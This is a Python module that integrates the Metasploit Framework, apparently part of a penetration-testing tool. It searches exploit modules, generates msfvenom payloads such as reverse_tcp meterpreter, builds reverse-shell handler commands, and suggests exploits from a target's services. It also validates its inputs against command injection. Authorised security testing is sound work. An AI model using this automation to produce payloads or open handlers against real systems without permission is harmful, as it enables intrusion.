"""Metasploit Framework Integration Module"""

import subprocess
import re
import json
from typing import Dict, List, Optional, Tuple

# SECURITY: allowlist validation to prevent command injection (CWE-78)
from ..utils.input_validator import validator, InputValidationError

# Allowed shapes for metasploit-specific inputs. Using argv + shell=False already
# removes OS-level shell injection; these patterns further constrain what can be
# fed into msfconsole's own command interpreter.
_MSF_SEARCH_RE = re.compile(r'^[A-Za-z0-9 _.:/\-]{1,200}$')
_MSF_MODULE_RE = re.compile(r'^[A-Za-z0-9_/]{1,200}$')
_MSF_FORMAT_RE = re.compile(r'^[A-Za-z0-9_\-]{1,32}$')


class MetasploitIntegration:
    """Integrates with Metasploit Framework for exploit automation"""

    def __init__(self, config_manager):
        """Initialize Metasploit integration"""
        self.config = config_manager
        self.msf_config = config_manager.get("metasploit", {})
        self.enabled = self.msf_config.get("enabled", False)

    def is_available(self) -> bool:
        """Check if Metasploit is available on the system"""
        try:
            result = subprocess.run(
                ["which", "msfconsole"],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except Exception:
            return False

    def search_exploits(self, query: str) -> List[Dict]:
        """
        Search for exploits in Metasploit database

        Args:
            query: Search query (CVE, platform, application, etc.)

        Returns:
            List of exploit modules
        """
        if not self.is_available():
            return []

        # SECURITY: constrain the search term before embedding in the msf command
        if not _MSF_SEARCH_RE.match(query or ""):
            print(f"Rejected invalid Metasploit search query: {query!r}")
            return []

        try:
            # argv list + shell=False: the whole "-x" value is one argument handed
            # to msfconsole, never interpreted by the OS shell.
            cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
            result = subprocess.run(
                cmd,
                shell=False,
                capture_output=True,
                text=True,
                timeout=30
            )

            return self._parse_search_results(result.stdout)

        except Exception as e:
            print(f"Error searching Metasploit: {e}")
            return []

    def _parse_search_results(self, output: str) -> List[Dict]:
        """Parse search results from msfconsole output"""
        exploits = []
        lines = output.split('\n')

        for line in lines:
            # Parse exploit entries
            if 'exploit/' in line or 'auxiliary/' in line:
                parts = line.split()
                if len(parts) >= 2:
                    exploits.append({
                        'name': parts[0] if parts else '',
                        'disclosure_date': parts[1] if len(parts) > 1 else '',
                        'rank': parts[2] if len(parts) > 2 else '',
                        'description': ' '.join(parts[3:]) if len(parts) > 3 else ''
                    })

        return exploits

    def get_exploit_info(self, exploit_path: str) -> Dict:
        """
        Get detailed information about an exploit module

        Args:
            exploit_path: Path to exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue)

        Returns:
            Exploit information including options, targets, payloads
        """
        if not self.is_available():
            return {}

        # SECURITY: module paths are letters/digits/underscore/slash only
        if not _MSF_MODULE_RE.match(exploit_path or ""):
            print(f"Rejected invalid exploit path: {exploit_path!r}")
            return {}

        try:
            cmd = ["msfconsole", "-q", "-x", f"use {exploit_path}; info; exit"]
            result = subprocess.run(
                cmd,
                shell=False,
                capture_output=True,
                text=True,
                timeout=30
            )

            return self._parse_exploit_info(result.stdout)

        except Exception as e:
            print(f"Error getting exploit info: {e}")
            return {}

    def _parse_exploit_info(self, output: str) -> Dict:
        """Parse exploit info from msfconsole output"""
        info = {
            'name': '',
            'description': '',
            'options': [],
            'targets': [],
            'references': []
        }

        lines = output.split('\n')
        current_section = None

        for line in lines:
            if 'Name:' in line:
                info['name'] = line.split('Name:')[1].strip()
            elif 'Description:' in line:
                current_section = 'description'
            elif 'Basic options:' in line or 'Module options' in line:
                current_section = 'options'
            elif 'Available targets:' in line:
                current_section = 'targets'
            elif 'References:' in line:
                current_section = 'references'

        return info

    def generate_payload(self, payload_type: str, lhost: str, lport: str,
                        format: str = "raw", encoder: str = None) -> Dict:
        """
        Generate payload using msfvenom

        Args:
            payload_type: Payload type (e.g., windows/meterpreter/reverse_tcp)
            lhost: Local host (attacker IP)
            lport: Local port
            format: Output format (raw, exe, elf, python, etc.)
            encoder: Encoder to use (optional)

        Returns:
            Dict with payload data and command
        """
        if not self.is_available():
            return {'success': False, 'error': 'Metasploit not available'}

        # SECURITY: validate every value before building the argv list
        try:
            if not _MSF_MODULE_RE.match(payload_type or ""):
                raise InputValidationError(f"Invalid payload type: {payload_type!r}")
            lhost = validator.validate_target(lhost)
            lport = validator.validate_port(str(lport))
            if not _MSF_FORMAT_RE.match(format or ""):
                raise InputValidationError(f"Invalid format: {format!r}")
            if encoder is not None and not _MSF_MODULE_RE.match(encoder):
                raise InputValidationError(f"Invalid encoder: {encoder!r}")
        except InputValidationError as e:
            return {'success': False, 'error': f'Input validation failed: {e}'}

        # Build argv list (no shell). LHOST/LPORT are separate arguments; their
        # values were validated to be an IP/host and a port number.
        cmd = ["msfvenom", "-p", payload_type,
               f"LHOST={lhost}", f"LPORT={lport}", "-f", format]
        if encoder:
            cmd += ["-e", encoder]

        try:
            result = subprocess.run(
                cmd,
                shell=False,
                capture_output=True,
                timeout=60
            )

            return {
                'success': result.returncode == 0,
                'payload': result.stdout,
                'error': result.stderr.decode() if result.stderr else '',
                'command': " ".join(cmd)
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': " ".join(cmd)
            }

    def list_payloads(self, platform: str = None) -> List[str]:
        """
        List available payloads

        Args:
            platform: Filter by platform (windows, linux, android, etc.)

        Returns:
            List of payload names
        """
        if not self.is_available():
            return []

        try:
            result = subprocess.run(
                ["msfvenom", "--list", "payloads"],
                shell=False,
                capture_output=True,
                text=True,
                timeout=30
            )

            payloads = []
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line and not line.startswith('#'):
                    if platform:
                        if platform.lower() in line.lower():
                            payloads.append(line.split()[0])
                    else:
                        if ' ' in line:
                            payloads.append(line.split()[0])

            return payloads

        except Exception as e:
            print(f"Error listing payloads: {e}")
            return []

    def start_handler(self, payload: str, lhost: str, lport: str) -> str:
        """
        Generate handler command for receiving connections

        Args:
            payload: Payload type used
            lhost: Local host
            lport: Local port

        Returns:
            Handler command to run in msfconsole
        """
        # SECURITY: validate values before composing a command the operator may
        # copy/paste into a shell. Reject anything outside the expected shapes.
        if not _MSF_MODULE_RE.match(payload or ""):
            return f"# Error: invalid payload {payload!r}"
        try:
            lhost = validator.validate_target(lhost)
            lport = validator.validate_port(str(lport))
        except InputValidationError as e:
            return f"# Error: {e}"

        handler_command = f"""msfconsole -q -x "use exploit/multi/handler;
set PAYLOAD {payload};
set LHOST {lhost};
set LPORT {lport};
exploit -j"
"""
        return handler_command.strip()

    def search_auxiliary(self, query: str) -> List[Dict]:
        """Search for auxiliary modules"""
        if not self.is_available():
            return []

        # SECURITY: constrain the search term
        if not _MSF_SEARCH_RE.match(query or ""):
            print(f"Rejected invalid auxiliary search query: {query!r}")
            return []

        try:
            cmd = ["msfconsole", "-q", "-x", f"search type:auxiliary {query}; exit"]
            result = subprocess.run(
                cmd,
                shell=False,
                capture_output=True,
                text=True,
                timeout=30
            )

            return self._parse_search_results(result.stdout)

        except Exception as e:
            print(f"Error searching auxiliary modules: {e}")
            return []

    def get_exploit_suggestions(self, target_info: Dict) -> List[Dict]:
        """
        Get exploit suggestions based on target information

        Args:
            target_info: Dict with os, version, services, etc.

        Returns:
            List of suggested exploits
        """
        suggestions = []

        os_type = target_info.get('os', '').lower()
        version = target_info.get('version', '')
        services = target_info.get('services', [])

        # Build search queries
        queries = []

        if os_type:
            queries.append(os_type)

        for service in services:
            service_name = service.get('name', '')
            service_version = service.get('version', '')

            if service_name:
                query = service_name
                if service_version:
                    query += f" {service_version}"
                queries.append(query)

        # Search for exploits
        for query in queries[:5]:  # Limit to first 5 queries
            results = self.search_exploits(query)
            suggestions.extend(results[:3])  # Top 3 results per query

        return suggestions

    def check_version(self) -> str:
        """Get Metasploit Framework version"""
        if not self.is_available():
            return "Not installed"

        try:
            result = subprocess.run(
                ["msfconsole", "--version"],
                capture_output=True,
                text=True,
                timeout=10
            )

            return result.stdout.strip()

        except Exception:
            return "Unknown"

    def update_database(self) -> Tuple[bool, str]:
        """
        Update Metasploit database

        Returns:
            Tuple of (success, message)
        """
        if not self.is_available():
            return False, "Metasploit not available"

        try:
            result = subprocess.run(
                ["msfdb", "init"],
                capture_output=True,
                text=True,
                timeout=120
            )

            success = result.returncode == 0
            message = result.stdout if success else result.stderr

            return success, message

        except Exception as e:
            return False, str(e)
